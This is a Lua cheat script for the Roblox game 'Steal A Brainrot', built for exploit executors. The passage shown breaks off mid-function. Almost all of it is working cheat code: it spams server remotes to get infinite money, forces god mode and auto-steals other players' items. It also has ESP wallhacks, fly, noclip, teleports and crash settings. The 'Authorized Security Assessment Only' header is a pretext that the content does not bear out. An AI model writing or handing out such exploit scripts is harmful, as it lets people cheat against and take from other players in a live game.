--[[
   Steal A Brainrot - Unnamed Enhancements Style v3.0
   Authorized Security Assessment Only
   Compatibility: Synapse X, Krnl, JJSploit, Script-ware, Fluxus, Arceus X
]]

-- ============================================================
-- CORE SETUP & SERVICE CACHING
-- ============================================================
local Services = {
    Players = game:GetService("Players"),
    RunService = game:GetService("RunService"),
    UserInputService = game:GetService("UserInputService"),
    TweenService = game:GetService("TweenService"),
    VirtualInputManager = game:GetService("VirtualInputManager"),
    Lighting = game:GetService("Lighting"),
    Workspace = game:GetService("Workspace"),
    ReplicatedStorage = game:GetService("ReplicatedStorage"),
    StarterGui = game:GetService("StarterGui"),
    CoreGui = game:GetService("CoreGui"),
    MarketplaceService = game:GetService("MarketplaceService"),
    TeleportService = game:GetService("TeleportService"),
    HttpService = game:GetService("HttpService"),
    Debris = game:GetService("Debris")
}

local LP = Services.Players.LocalPlayer
local Mouse = LP:GetMouse()
local Camera = Services.Workspace.CurrentCamera

-- ============================================================
-- CONFIGURATION MANAGER
-- ============================================================
local Config = {}
Config.__index = function(t, k)
    local defaults = rawget(t, "__defaults")
    return defaults and defaults[k]
end
setmetatable(Config, Config)

Config.__defaults = {
    InfiniteMoney = false,
    SpeedEnabled = false,
    SpeedValue = 50,
    GodMode = false,
    AutoSteal = false,
    ESPEnabled = false,
    ESPColor = Color3.fromRGB(255, 50, 50),
    FlyMode = false,
    FlySpeed = 50,
    NoclipEnabled = false,
    AutoComplete = false,
    TeleportToPlayers = false,
    JumpPower = 100,
    CrashEnabled = false,
    CrashIntensity = 1.0,
    CrashDuration = 8,
    CrashAutoRefresh = false,
    InfiniteJump = false,
    AntiAFK = false,
    FloatMode = false,
    FullBright = false,
    NoFog = false,
    HideUIOnLoad = false,
    TrailsEnabled = false,
    CrosshairEnabled = false,
}

local function LoadConfig()
    local data = {}
    local success = pcall(function()
        if readfile then
            data = Services.HttpService:JSONDecode(readfile("SAB_Config.json"))
        end
    end)
    if success and type(data) == "table" then
        for k, v in pairs(data) do
            Config[k] = v
        end
    end
end

local function SaveConfig()
    local data = {}
    for k, v in pairs(Config) do
        if k ~= "__defaults" and type(k) == "string" then
            data[k] = v
        end
    end
    local success = pcall(function()
        if writefile then
            writefile("SAB_Config.json", Services.HttpService:JSONEncode(data))
        end
    end)
    return success
end

LoadConfig()

-- ============================================================
-- NOTIFICATION SYSTEM
-- ============================================================
local Notifications = {}
do
    local NotificationGui = Instance.new("ScreenGui")
    NotificationGui.Name = "SAB_Notifications"
    NotificationGui.ResetOnSpawn = false
    NotificationGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    NotificationGui.DisplayOrder = 999
    pcall(function() NotificationGui.Parent = Services.CoreGui end)
    if not NotificationGui.Parent then
        NotificationGui.Parent = LP:WaitForChild("PlayerGui")
    end

    local NotificationHolder = Instance.new("Frame")
    NotificationHolder.Name = "Holder"
    NotificationHolder.Size = UDim2.new(0, 300, 0, 0)
    NotificationHolder.Position = UDim2.new(1, -320, 0, 10)
    NotificationHolder.BackgroundTransparency = 1
    NotificationHolder.Parent = NotificationGui
    NotificationHolder.AutomaticSize = Enum.AutomaticSize.Y

    local UIListLayout = Instance.new("UIListLayout")
    UIListLayout.Padding = UDim.new(0, 5)
    UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Top
    UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout.Parent = NotificationHolder

    function Notifications:Notify(text, duration, color)
        duration = duration or 3
        color = color or Color3.fromRGB(0, 170, 255)

        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0, 280, 0, 36)
        frame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
        frame.BackgroundTransparency = 0.15
        frame.BorderSizePixel = 0
        frame.ClipsDescendants = true
        frame.Parent = NotificationHolder

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 6)
        corner.Parent = frame

        local accent = Instance.new("Frame")
        accent.Size = UDim2.new(0, 4, 1, 0)
        accent.BackgroundColor3 = color
        accent.BorderSizePixel = 0
        accent.Parent = frame

        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, -16, 1, 0)
        label.Position = UDim2.new(0, 12, 0, 0)
        label.BackgroundTransparency = 1
        label.Text = text
        label.TextColor3 = Color3.fromRGB(240, 240, 240)
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.TextSize = 14
        label.Font = Enum.Font.GothamMedium
        label.TextTruncate = Enum.TextTruncate.AtEnd
        label.Parent = frame

        task.delay(duration, function()
            local outTween = Services.TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                Size = UDim2.new(0, 0, 0, 36),
                BackgroundTransparency = 1
            })
            outTween:Play()
            outTween.Completed:Connect(function()
                frame:Destroy()
            end)
            label.TextTransparency = 1
        end)
    end
end

-- ============================================================
-- DEBUG / SAFE CALL
-- ============================================================
local function DebugWarn(tag, err)
    warn("[SAB]", tag, err)
end

local function SafeCall(tag, fn, ...)
    local args = table.pack(...)
    local ok, err = pcall(function()
        return fn(table.unpack(args, 1, args.n))
    end)
    if not ok then
        DebugWarn(tag, err)
        Notifications:Notify(tag .. ": " .. tostring(err), 4, Color3.fromRGB(255, 80, 80))
    end
    return ok, err
end

-- ============================================================
-- UTILITY FUNCTIONS
-- ============================================================
local function GetCharacter()
    return LP.Character
end

local function WaitForCharacter()
    if LP.Character then
        return LP.Character
    end
    return LP.CharacterAdded:Wait()
end

local function GetHRP()
    local char = GetCharacter()
    return char and char:FindFirstChild("HumanoidRootPart")
end

local function GetHumanoid()
    local char = GetCharacter()
    return char and char:FindFirstChildOfClass("Humanoid")
end

local function SafeTeleport(cframe)
    local hrp = GetHRP()
    if hrp then
        hrp.CFrame = cframe
    end
end

local function FindBrainrotItems()
    local items = {}
    for _, v in ipairs(Services.Workspace:GetDescendants()) do
        if v:IsA("BasePart") and not v:IsA("Terrain") then
            local name = v.Name:lower()
            if name:find("brainrot") or name:find("brain") or name:find("item") or name:find("steal") then
                table.insert(items, v)
            end
        end
        if v:IsA("ClickDetector") then
            table.insert(items, {type = "click", obj = v.Parent, detector = v})
        elseif v:IsA("ProximityPrompt") then
            table.insert(items, {type = "prompt", obj = v.Parent, prompt = v})
        end
    end
    return items
end

local function FindPlayerBase(targetPlayer)
    targetPlayer = targetPlayer or LP
    for _, v in ipairs(Services.Workspace:GetDescendants()) do
        if v:IsA("Model") or v:IsA("Folder") then
            local name = v.Name:lower()
            if (name:find("base") or name:find("house") or name:find("studio")) and
               (name:find(targetPlayer.Name:lower()) or name == targetPlayer.Name or
                (v:FindFirstChild("Owner") and v:FindFirstChild("Owner").Value == targetPlayer)) then
                return v
            end
        end
    end
    return nil
end

-- Cache remotes to avoid rescanning every frame
local RemoteCache = {}
local RemoteCacheTime = 0

local function FindRemoteEvents()
    -- Refresh cache every 10 seconds
    if #RemoteCache > 0 and tick() - RemoteCacheTime < 10 then
        return RemoteCache
    end
    RemoteCache = {}
    local seen = {}
    local function addRemote(obj)
        if seen[obj] then return end
        seen[obj] = true
        table.insert(RemoteCache, {Name = obj.Name, Remote = obj})
    end
    for _, obj in ipairs(Services.ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") or obj:IsA("BindableEvent") then
            addRemote(obj)
        end
    end
    for _, obj in ipairs(Services.Workspace:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            addRemote(obj)
        end
    end
    RemoteCacheTime = tick()
    return RemoteCache
end

-- Safe remote call: uses :FireServer for RemoteEvents, :InvokeServer for RemoteFunctions
local function FireRemote(remote, ...)
    local args = table.pack(...)
    if remote:IsA("RemoteEvent") then
        remote:FireServer(table.unpack(args, 1, args.n))
    elseif remote:IsA("RemoteFunction") then
        pcall(function()
            remote:InvokeServer(table.unpack(args, 1, args.n))
        end)
    elseif remote:IsA("BindableEvent") then
        remote:Fire(table.unpack(args, 1, args.n))
    end
end

-- ============================================================
-- FEATURE: INFINITE MONEY
-- ============================================================
local MoneyConnection = nil
local MoneyCacheTimer = 0

local function ToggleInfiniteMoney(enabled)
    if enabled then
        if MoneyConnection then return end
        MoneyConnection = Services.RunService.Heartbeat:Connect(function()
            if not LP.Character then return end

            -- Only rescan remotes every 2 seconds instead of every frame
            if tick() - MoneyCacheTimer > 2 then
                local remotes = FindRemoteEvents()
                for _, entry in ipairs(remotes) do
                    local ln = entry.Name:lower()
                    if ln:find("money") or ln:find("cash") or ln:find("currency") or
                       ln:find("claim") or ln:find("reward") or ln:find("earn") or
                       ln:find("steal") or ln:find("generate") then
                        pcall(function()
                            FireRemote(entry.Remote, math.huge)
                        end)
                    end
                end

                for _, v in ipairs(Services.Workspace:GetDescendants()) do
                    if (v:IsA("NumberValue") or v:IsA("IntValue")) then
                        local ln = v.Name:lower()
                        if (ln:find("money") or ln:find("cash") or ln:find("balance")) and v.Parent then
                            pcall(function()
                                v.Value = 999999999
                            end)
                        end
                    end
                end
                MoneyCacheTimer = tick()
            end
        end)
        Notifications:Notify("Infinite Money enabled", 3, Color3.fromRGB(0, 255, 100))
    else
        if MoneyConnection then
            MoneyConnection:Disconnect()
            MoneyConnection = nil
        end
        Notifications:Notify("Infinite Money disabled", 3, Color3.fromRGB(255, 100, 0))
    end
end

-- ============================================================
-- FEATURE: SPEED HACK
-- ============================================================
local SpeedConnection = nil

local function ToggleSpeed(enabled)
    if enabled then
        if SpeedConnection then return end
        local hum = GetHumanoid()
        if hum then hum.WalkSpeed = Config.SpeedValue or 50 end
        SpeedConnection = Services.RunService.Heartbeat:Connect(function()
            local hum2 = GetHumanoid()
            if hum2 and Config.SpeedEnabled then
                hum2.WalkSpeed = Config.SpeedValue or 50
            end
        end)
        Notifications:Notify("Speed: " .. tostring(Config.SpeedValue or 50), 2, Color3.fromRGB(0, 200, 255))
    else
        if SpeedConnection then
            SpeedConnection:Disconnect()
            SpeedConnection = nil
        end
        local hum = GetHumanoid()
        if hum then hum.WalkSpeed = 16 end
        Notifications:Notify("Speed disabled", 2, Color3.fromRGB(255, 100, 0))
    end
end

-- ============================================================
-- FEATURE: GOD MODE
-- ============================================================
local GodModeFlag = false
local GodModeConnections = {}

local function ToggleGodMode(enabled)
    if enabled then
        if GodModeFlag then return end
        for _, conn in ipairs(GodModeConnections) do
            pcall(conn.Disconnect, conn)
        end
        GodModeConnections = {}
        GodModeFlag = true

        local conn1 = Services.RunService.Heartbeat:Connect(function()
            local humanoid = GetHumanoid()
            if humanoid then
                humanoid.Health = humanoid.MaxHealth
            end
        end)
        table.insert(GodModeConnections, conn1)

        local conn2 = LP.CharacterAdded:Connect(function(char)
            local hum = char:WaitForChild("Humanoid")
            hum.Health = hum.MaxHealth
            local dmgConn
            dmgConn = hum:GetPropertyChangedSignal("Health"):Connect(function()
                if hum and hum.Health < hum.MaxHealth and Config.GodMode then
                    hum.Health = hum.MaxHealth
                end
            end)
            table.insert(GodModeConnections, dmgConn)
        end)
        table.insert(GodModeConnections, conn2)

        local humanoid = GetHumanoid()
        if humanoid then
            local dmgConn = humanoid:GetPropertyChangedSignal("Health"):Connect(function()
                if humanoid and humanoid.Health < humanoid.MaxHealth and Config.GodMode then
                    humanoid.Health = humanoid.MaxHealth
                end
            end)
            table.insert(GodModeConnections, dmgConn)
        end

        Notifications:Notify("God Mode enabled", 3, Color3.fromRGB(255, 200, 0))
    else
        for _, conn in ipairs(GodModeConnections) do
            pcall(conn.Disconnect, conn)
        end
        GodModeConnections = {}
        GodModeFlag = false
        Notifications:Notify("God Mode disabled", 2, Color3.fromRGB(255, 100, 0))
    end
end

-- ============================================================
-- FEATURE: AUTO-STEAL
-- ============================================================
local AutoStealRunning = false
local AutoStealThread = nil

local function PerformInstantSteal()
    local hrp = GetHRP()
    if not hrp then return end

    local items = FindBrainrotItems()
    local stolen = 0

    for _, item in ipairs(items) do
        if type(item) == "table" then
            if item.type == "click" and item.detector then
                pcall(function()
                    fireclickdetector(item.detector)
                    stolen = stolen + 1
                end)
            elseif item.type == "prompt" and item.prompt then
                pcall(function()
                    item.prompt.HoldDuration = 0
                    fireproximityprompt(item.prompt)
                    stolen = stolen + 1
                end)
            end
        else
            if item:IsA("BasePart") and hrp then
                pcall(function()
                    local touch = item.CFrame * CFrame.new(0, 3, 0)
                    hrp.CFrame = touch
                    task.wait(0.05)
                    firetouchinterest(hrp, item, 0)
                    task.wait(0.05)
                    firetouchinterest(hrp, item, 1)
                    stolen = stolen + 1
                end)
            end
        end
    end

    Notifications:Notify("Stole " .. stolen .. " items!", 2, Color3.fromRGB(255, 50, 50))
end

local function ToggleAutoSteal(enabled)
    if enabled then
        if AutoStealRunning then return end
        AutoStealRunning = true

        AutoStealThread = task.spawn(function()
            while Config.AutoSteal and AutoStealRunning do
                PerformInstantSteal()
                task.wait(0.5)
            end
        end)
        Notifications:Notify("Auto-Steal enabled", 3, Color3.fromRGB(255, 50, 50))
    else
        AutoStealRunning = false
        if AutoStealThread then
            task.cancel(AutoStealThread)
            AutoStealThread = nil
        end
        Notifications:Notify("Auto-Steal disabled", 2, Color3.fromRGB(255, 100, 0))
    end
end

-- ============================================================
-- FEATURE: ESP / WALLHACK
-- ============================================================
local ESPConnections = {}
local ESPObjects = {}
local ESPHighlights = {}

local function CreateESP(instance, color, label)
    if not instance or not instance.Parent then return end
    if ESPObjects[instance] then
        ESPObjects[instance].Enabled = Config.ESPEnabled
        if ESPHighlights[instance] then
            ESPHighlights[instance].Enabled = Config.ESPEnabled
        end
        return
    end

    color = color or Config.ESPColor or Color3.fromRGB(255, 50, 50)
    label = label or instance.Name

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "SAB_ESP_" .. label
    billboard.Size = UDim2.new(0, 120, 0, 40)
    billboard.StudsOffset = Vector3.new(0, 2.5, 0)
    billboard.AlwaysOnTop = true
    billboard.Enabled = Config.ESPEnabled
    billboard.Parent = instance

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = color
    frame.BackgroundTransparency = 0.4
    frame.BorderSizePixel = 0
    frame.Parent = billboard

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 4)
    corner.Parent = frame

    local text = Instance.new("TextLabel")
    text.Size = UDim2.new(1, 0, 1, 0)
    text.BackgroundTransparency = 1
    text.Text = label
    text.TextColor3 = Color3.fromRGB(255, 255, 255)
    text.TextScaled = true
    text.Font = Enum.Font.GothamBold
    text.TextStrokeTransparency = 0.5
    text.TextStrokeColor3 = Color3.new(0, 0, 0)
    text.Parent = frame

    local highlight = Instance.new("Highlight")
    highlight.Name = "SAB_Highlight"
    highlight.Adornee = instance
    highlight.FillColor = color
    highlight.FillTransparency = 0.5
    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
    highlight.OutlineTransparency = 0.3
    highlight.Enabled = Config.ESPEnabled
    highlight.Parent = instance

    ESPObjects[instance] = billboard
    ESPHighlights[instance] = highlight
    return billboard
end

local function ScanESP()
    for _, conn in ipairs(ESPConnections) do
        pcall(conn.Disconnect, conn)
    end
    ESPConnections = {}

    -- Clean up existing ESP objects
    for v, billboard in pairs(ESPObjects) do
        if billboard and billboard.Parent then
            billboard:Destroy()
        end
    end
    for v, highlight in pairs(ESPHighlights) do
        if highlight and highlight.Parent then
            highlight:Destroy()
        end
    end
    ESPObjects = {}
    ESPHighlights = {}

    if not Config.ESPEnabled then return end

    for _, v in ipairs(Services.Workspace:GetDescendants()) do
        if v:IsA("BasePart") and not v:IsA("Terrain") then
            local name = v.Name:lower()
            if name:find("brainrot") or name:find("brain") or name:find("item") or
               name:find("steal") or name:find("pickup") or name:find("loot") then
                CreateESP(v, Color3.fromRGB(255, 50, 50), "STEAL")
            end
        end
    end

    for _, player in ipairs(Services.Players:GetPlayers()) do
        if player ~= LP then
            local char = player.Character
            if char then
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    CreateESP(hrp, Color3.fromRGB(50, 150, 255), player.Name)
                end
                local conn = player.CharacterAdded:Connect(function(newChar)
                    task.wait(0.5)
                    local newHrp = newChar:FindFirstChild("HumanoidRootPart")
                    if newHrp and Config.ESPEnabled then
                        CreateESP(newHrp, Color3.fromRGB(50, 150, 255), player.Name)
                    end
                end)
                table.insert(ESPConnections, conn)
            end
        end
    end

    local conn = Services.Workspace.DescendantAdded:Connect(function(v)
        if not Config.ESPEnabled then return end
        task.wait(0.1)
        if v:IsA("BasePart") and not v:IsA("Terrain") then
            local name = v.Name:lower()
            if name:find("brainrot") or name:find("brain") or name:find("item") or
               name:find("steal") or name:find("pickup") or name:find("loot") then
                CreateESP(v, Color3.fromRGB(255, 50, 50), "STEAL")
            end
        end
    end)
    table.insert(ESPConnections, conn)
end

-- ============================================================
-- FEATURE: FLY MODE
-- ============================================================
local FlyConnection = nil
local FlyBodyVelocity = nil
local FlyBodyGyro = nil

local function ToggleFly(enabled)
    if enabled then
        if FlyConnection then return end
        local hrp = GetHRP()
        local humanoid = GetHumanoid()
        if not hrp or not humanoid then return end

        humanoid.PlatformStand = false

        if FlyBodyVelocity then FlyBodyVelocity:Destroy() end
        if FlyBodyGyro then FlyBodyGyro:Destroy() end

        FlyBodyVelocity = Instance.new("BodyVelocity")
        FlyBodyVelocity.Name = "SAB_FlyVelocity"
        FlyBodyVelocity.MaxForce = Vector3.new(1, 1, 1) * 10000
        FlyBodyVelocity.Velocity = Vector3.new(0, 0, 0)
        FlyBodyVelocity.P = 1000
        FlyBodyVelocity.Parent = hrp

        FlyBodyGyro = Instance.new("BodyGyro")
        FlyBodyGyro.Name = "SAB_FlyGyro"
        FlyBodyGyro.MaxTorque = Vector3.new(1, 1, 1) * 10000
        FlyBodyGyro.P = 1000
        FlyBodyGyro.D = 50
        FlyBodyGyro.Parent = hrp

        FlyConnection = Services.RunService.RenderStepped:Connect(function()
            if not Config.FlyMode then return end
            local hrp2 = GetHRP()
            if not hrp2 or not FlyBodyVelocity or not FlyBodyGyro then return end
            if FlyBodyVelocity.Parent ~= hrp2 then
                FlyBodyVelocity.Parent = hrp2
                FlyBodyGyro.Parent = hrp2
            end

            local cam = Services.Workspace.CurrentCamera
            if not cam then return end
            local cameraCF = cam.CFrame
            local relative = Vector3.new(0, 0, 0)
            local speed = (Config.FlySpeed or 50) * (Services.UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) and 3 or 1)

            if Services.UserInputService:IsKeyDown(Enum.KeyCode.W) then
                relative = relative + (cameraCF.LookVector * speed)
            end
            if Services.UserInputService:IsKeyDown(Enum.KeyCode.S) then
                relative = relative - (cameraCF.LookVector * speed)
            end
            if Services.UserInputService:IsKeyDown(Enum.KeyCode.A) then
                relative = relative - (cameraCF.RightVector * speed)
            end
            if Services.UserInputService:IsKeyDown(Enum.KeyCode.D) then
                relative = relative + (cameraCF.RightVector * speed)
            end
            if Services.UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                relative = relative + Vector3.new(0, speed, 0)
            end
            if Services.UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
                relative = relative - Vector3.new(0, speed, 0)
            end

            FlyBodyVelocity.Velocity = relative
            FlyBodyGyro.CFrame = CFrame.lookAt(hrp2.Position, hrp2.Position + cameraCF.LookVector)

            local hum = GetHumanoid()
            if hum then hum.PlatformStand = true end
        end)

        Notifications:Notify("Fly enabled", 2, Color3.fromRGB(100, 200, 255))
    else
        local humanoid = GetHumanoid()
        if FlyConnection then
            FlyConnection:Disconnect()
            FlyConnection = nil
        end
        if FlyBodyVelocity then
            FlyBodyVelocity:Destroy()
            FlyBodyVelocity = nil
        end
        if FlyBodyGyro then
            FlyBodyGyro:Destroy()
            FlyBodyGyro = nil
        end
        if humanoid then
            humanoid.PlatformStand = false
        end
        local hrp2 = GetHRP()
        if hrp2 then
            hrp2.Velocity = Vector3.new(0, 0, 0)
        end
        Notifications:Notify("Fly disabled", 2, Color3.fromRGB(255, 100, 0))
    end
end

-- ============================================================
-- FEATURE: NOCLIP
-- ============================================================
local NoclipConnection = nil
-- Track original CanCollide values to properly restore
local OriginalCollision = {}

local function ToggleNoclip(enabled)
    if enabled then
        if NoclipConnection then return end

        -- Save original collision states
        local char = GetCharacter()
        if char then
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") then
                    OriginalCollision[part] = part.CanCollide
                end
            end
        end

        NoclipConnection = Services.RunService.Stepped:Connect(function()
            if not Config.NoclipEnabled then return end
            local char2 = GetCharacter()
            if not char2 then return end
            for _, part in ipairs(char2:GetDescendants()) do
                if part:IsA("BasePart") then
                    if OriginalCollision[part] == nil then
                        OriginalCollision[part] = part.CanCollide
                    end
                    part.CanCollide = false
                end
            end
        end)

        Notifications:Notify("Noclip enabled", 2, Color3.fromRGB(150, 100, 255))
    else
        if NoclipConnection then
            NoclipConnection:Disconnect()
            NoclipConnection = nil
        end
        -- Restore original collision states
        local char = GetCharacter()
        if char then
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") and OriginalCollision[part] ~= nil then
                    part.CanCollide = OriginalCollision[part]
                end
            end
        end
        OriginalCollision = {}
        Notifications:Notify("Noclip disabled", 2, Color3.fromRGB(255, 100, 0))
    end
end

-- Hook character respawns to track new parts
LP.CharacterAdded:Connect(function(char)
    if Config.NoclipEnabled then
        OriginalCollision = {}
        char:WaitForChild("HumanoidRootPart")
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                OriginalCollision[part] = part.CanCollide
            end
        end
    end

    if Config.FlyMode then
        task.wait(0.5)
        if FlyConnection then
            FlyConnection:Disconnect()
            FlyConnection = nil
        end
        if FlyBodyVelocity then FlyBodyVelocity:Destroy() FlyBodyVelocity = nil end
        if FlyBodyGyro then FlyBodyGyro:Destroy() FlyBodyGyro = nil end
        SafeCall("FlyRespawn", ToggleFly, true)
    end
    if Config.FloatMode then
        if FloatConnection then FloatConnection:Disconnect() FloatConnection = nil end
        if FloatBody then FloatBody:Destroy() FloatBody = nil end
        FloatHoldY = nil
        task.wait(0.5)
        SafeCall("FloatRespawn", ToggleFloat, true)
    end
end)

-- ============================================================
-- FEATURE: AUTO-COMPLETE LEVELS
-- ============================================================
local AutoCompleteConnection = nil

local function ToggleAutoComplete(enabled)
    if enabled then
        if AutoCompleteConnection then return end

        AutoCompleteConnection = Services.RunService.Heartbeat:Connect(function()
            if not Config.AutoComplete then return end

            local remotes = FindRemoteEvents()
            for _, entry in ipairs(remotes) do
                local ln = entry.Name:lower()
                if ln:find("complete") or ln:find("finish") or ln:find("level") or
                   ln:find("objective") or ln:find("quest") or ln:find("reward") or
                   ln:find("tutorial") or ln:find("skip") or ln:find("claim") then
                    pcall(function()
                        FireRemote(entry.Remote)
                    end)
                end
            end

            for _, v in ipairs(Services.Workspace:GetDescendants()) do
                if v:IsA("ProximityPrompt") then
                    pcall(function()
                        v.HoldDuration = 0
                        fireproximityprompt(v)
                    end)
                end
                if v:IsA("ClickDetector") then
                    pcall(function()
                        fireclickdetector(v)
                    end)
                end
            end
        end)

        Notifications:Notify("Auto-Complete enabled", 3, Color3.fromRGB(0, 255, 200))
    else
        if AutoCompleteConnection then
            AutoCompleteConnection:Disconnect()
            AutoCompleteConnection = nil
        end
        Notifications:Notify("Auto-Complete disabled", 2, Color3.fromRGB(255, 100, 0))
    end
end

-- ============================================================
-- FEATURE: TELEPORT TO PLAYER / BASE
-- ============================================================
local function TeleportToPlayer(targetPlayer)
    if not targetPlayer or targetPlayer == LP then
        Notifications:Notify("Invalid target", 2, Color3.fromRGB(255, 0, 0))
        return
    end

    local char = targetPlayer.Character
    if not char then
        Notifications:Notify(targetPlayer.Name .. " has no character", 2, Color3.fromRGB(255, 100, 0))
        return
    end

    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then
        Notifications:Notify("Cannot find target's root", 2, Color3.fromRGB(255, 0, 0))
        return
    end

    SafeTeleport(hrp.CFrame * CFrame.new(0, 3, 0))
    Notifications:Notify("Teleported to " .. targetPlayer.Name, 2, Color3.fromRGB(100, 200, 255))
end

local function TeleportToBase(targetPlayer)
    targetPlayer = targetPlayer or LP
    local base = FindPlayerBase(targetPlayer)
    if base then
        local found = false
        for _, v in ipairs(base:GetDescendants()) do
            if v:IsA("BasePart") then
                SafeTeleport(v.CFrame * CFrame.new(0, 3, 5))
                Notifications:Notify("Teleported to base", 2, Color3.fromRGB(100, 200, 255))
                found = true
                break
            end
        end
        if not found then
            Notifications:Notify("Base has no parts", 2, Color3.fromRGB(255, 100, 0))
        end
    else
        Notifications:Notify("Base not found", 2, Color3.fromRGB(255, 100, 0))
    end
end

-- ============================================================
-- FEATURE: TP TO BEST BRAINROT
-- ============================================================
local function TeleportToBestBrainrot()
    local hrp = GetHRP()
    if not hrp then
        Notifications:Notify("Character not loaded", 2, Color3.fromRGB(255, 100, 0))
        return
    end
    local best, bestDist = nil, math.huge
    for _, v in ipairs(Services.Workspace:GetDescendants()) do
        if v:IsA("BasePart") and not v:IsA("Terrain") then
            local name = v.Name:lower()
            if name:find("brainrot") or name:find("brain") or name:find("steal")
                or name:find("pickup") or name:find("loot") or name:find("item") then
                local dist = (v.Position - hrp.Position).Magnitude
                if dist < bestDist then
                    bestDist = dist
                    best = v
                end
            end
        end
    end
    if best then
        SafeTeleport(best.CFrame * CFrame.new(0, 3, 0))
        Notifications:Notify("TP to " .. best.Name, 2, Color3.fromRGB(124, 58, 237))
    else
        Notifications:Notify("No brainrot found nearby", 2, Color3.fromRGB(255, 100, 0))
    end
end

-- ============================================================
-- FEATURE: INFINITE JUMP
-- ============================================================
local InfJumpConnection = nil

local function ToggleInfiniteJump(enabled)
    if enabled then
        if InfJumpConnection then return end
        InfJumpConnection = Services.UserInputService.JumpRequest:Connect(function()
            if not Config.InfiniteJump then return end
            local hum = GetHumanoid()
            if hum then
                hum:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end)
        Notifications:Notify("Infinite Jump enabled", 2, Color3.fromRGB(124, 58, 237))
    else
        if InfJumpConnection then
            InfJumpConnection:Disconnect()
            InfJumpConnection = nil
        end
        Notifications:Notify("Infinite Jump disabled", 2, Color3.fromRGB(255, 100, 0))
    end
end

-- ============================================================
-- FEATURE: ANTI-AFK
-- ============================================================
local AntiAFKConnection = nil

local function ToggleAntiAFK(enabled)
    if enabled then
        if AntiAFKConnection then return end
        local VirtualUser = game:GetService("VirtualUser")
        AntiAFKConnection = LP.Idled:Connect(function()
            VirtualUser:CaptureFocus()
            VirtualUser:ClickButton2(Vector2.new())
        end)
        Notifications:Notify("Anti-AFK enabled", 2, Color3.fromRGB(124, 58, 237))
    else
        if AntiAFKConnection then
            AntiAFKConnection:Disconnect()
            AntiAFKConnection = nil
        end
        Notifications:Notify("Anti-AFK disabled", 2, Color3.fromRGB(255, 100, 0))
    end
end

-- ============================================================
-- FEATURE: FLOAT
-- ============================================================
local FloatConnection = nil
local FloatBody = nil
local FloatHoldY = nil

local function ToggleFloat(enabled)
    if enabled then
        if FloatConnection then return end
        local hrp = GetHRP()
        if not hrp then return end
        FloatHoldY = hrp.Position.Y
        FloatBody = Instance.new("BodyPosition")
        FloatBody.Name = "SAB_Float"
        FloatBody.MaxForce = Vector3.new(1, 1, 1) * 100000
        FloatBody.P = 8000
        FloatBody.D = 500
        FloatBody.Position = hrp.Position
        FloatBody.Parent = hrp
        FloatConnection = Services.RunService.RenderStepped:Connect(function()
            if not Config.FloatMode then return end
            local h = GetHRP()
            if h and FloatBody then
                FloatHoldY = FloatHoldY or h.Position.Y
                FloatBody.Position = Vector3.new(h.Position.X, FloatHoldY, h.Position.Z)
            end
        end)
        Notifications:Notify("Float enabled", 2, Color3.fromRGB(124, 58, 237))
    else
        if FloatConnection then
            FloatConnection:Disconnect()
            FloatConnection = nil
        end
        if FloatBody then
            FloatBody:Destroy()
            FloatBody = nil
        end
        FloatHoldY = nil
        Notifications:Notify("Float disabled", 2, Color3.fromRGB(255, 100, 0))
    end
end

-- ============================================================
-- FEATURE: WORLD / VISUALS (Full Bright, No Fog)
-- ============================================================
local SavedLighting = {}

local function ToggleFullBright(enabled)
    if enabled then
        SavedLighting.Ambient = Services.Lighting.Ambient
        SavedLighting.OutdoorAmbient = Services.Lighting.OutdoorAmbient
        SavedLighting.Brightness = Services.Lighting.Brightness
        Services.Lighting.Ambient = Color3.fromRGB(255, 255, 255)
        Services.Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
        Services.Lighting.Brightness = 2.5
    else
        if SavedLighting.Ambient then Services.Lighting.Ambient = SavedLighting.Ambient end
        if SavedLighting.OutdoorAmbient then Services.Lighting.OutdoorAmbient = SavedLighting.OutdoorAmbient end
        Services.Lighting.Brightness = SavedLighting.Brightness or 1
    end
end

local function ToggleNoFog(enabled)
    if enabled then
        SavedLighting.FogEnd = Services.Lighting.FogEnd
        SavedLighting.FogStart = Services.Lighting.FogStart
        Services.Lighting.FogEnd = 100000
        Services.Lighting.FogStart = 100000
    else
        if SavedLighting.FogEnd then Services.Lighting.FogEnd = SavedLighting.FogEnd end
        if SavedLighting.FogStart then Services.Lighting.FogStart = SavedLighting.FogStart end
    end
end

-- ============================================================
-- FEATURE: TRAIL EFFECTS
-- ============================================================
local TrailConnection = nil
local TrailParts = {}

local function ToggleTrails(enabled)
    if enabled then
        if TrailConnection then return end

        TrailConnection = Services.RunService.RenderStepped:Connect(function()
            local hrp = GetHRP()
            if not hrp then return end

            local trailPart = Instance.new("Part")
            trailPart.Size = Vector3.new(0.3, 0.3, 0.3)
            trailPart.Shape = Enum.PartType.Ball
            trailPart.Material = Enum.Material.Neon
            trailPart.Color = Color3.fromRGB(100, 200, 255)
            trailPart.Anchored = true
            trailPart.CanCollide = false
